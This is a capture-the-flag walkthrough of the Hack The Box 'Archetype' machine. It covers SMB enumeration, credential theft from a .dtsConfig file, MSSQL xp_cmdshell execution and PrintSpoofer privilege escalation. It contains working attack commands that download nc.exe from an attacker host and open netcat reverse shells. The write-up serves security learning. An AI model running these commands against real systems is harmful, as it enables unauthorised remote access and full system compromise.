## 🧾 HTB: Archetype — Walkthrough (Markdown for GitHub)

````markdown
# HTB - Archetype

**Difficulty:** Easy  
**Category:** MSSQL, SMB, PowerShell, Reconnaissance, RCE, Token Impersonation  
**Status:** Completed  
**Date Started:** 11/06/25  
**Date Completed:** 23/06/25  

---

## 🧪 Initial Enumeration

**Tools Used:**  
- `nmap`  
- `smbclient`  
- `enum4linux`  

**Nmap Command:**

```bash
nmap -Pn -sV -T4 10.129.172.114
````

**Open Ports:**

* 135 (MS RPC)
* 139, 445 (SMB)
* 1433 (Microsoft SQL Server)
* 5985 (WinRM)

---

## 📂 SMB Enumeration

```bash
smbclient -L \\10.129.172.114 -N
```

* Found a share with a `.dtsConfig` file containing **cleartext MSSQL credentials**.

---

## 🎯 MSSQL Exploitation

```bash
python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.172.114 -windows-auth
```

**Checked SQL Role:**

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
-- Result: 1 ✅ (sysadmin)
```

**Enabled Command Execution:**

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

---

## 🐚 Reverse Shell via xp\_cmdshell

**On attacker:**

```bash
sudo python3 -m http.server 80
```

**On victim via MSSQL:**

```sql
EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest http://10.10.14.75/nc.exe -OutFile C:\Windows\Temp\nc.exe"'
EXEC xp_cmdshell 'C:\Windows\Temp\nc.exe 10.10.14.75 4444 -e cmd.exe'
```

**Listener:**

```bash
nc -lvnp 4444
```

**Got shell as:** `archetype\sql_svc`

---

## 🔍 Privilege Escalation

**Enumeration Tool:**

* `winPEAS.exe`

**Key Finding:**

* `SeImpersonatePrivilege` was **enabled**

---

## 🧨 SYSTEM Shell via PrintSpoofer

Uploaded `PrintSpoofer64.exe` and ran:

```cmd
C:\Users\Public\PrintSpoofer64.exe -i -c "cmd.exe /c C:\Users\Public\nc.exe 10.10.14.75 7777 -e cmd.exe"
```

**Got SYSTEM shell!**

```bash
whoami
nt authority\system
```

---

## 🏁 Flags

* **User Flag:** ✅ `C:\Users\sql_svc\Desktop\user.txt`
* **Root Flag:** ✅ `C:\Users\Administrator\Desktop\root.txt`

---

## 📚 Lessons Learned

* `.dtsConfig` files often contain **plaintext MSSQL credentials**
* **xp\_cmdshell** and **PrintSpoofer** remain powerful escalation paths when misconfigured
* **SeImpersonatePrivilege** can be a goldmine if exploitable
* Tools like `winPEAS` are essential for spotting weak configurations

---

## 🔗 Resources

* [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

---

## 🗂 Files Collected

* `winpeas-output.txt`
* `nc.exe`
* `PrintSpoofer64.exe`
* `.dtsConfig` credential file

```

---


```
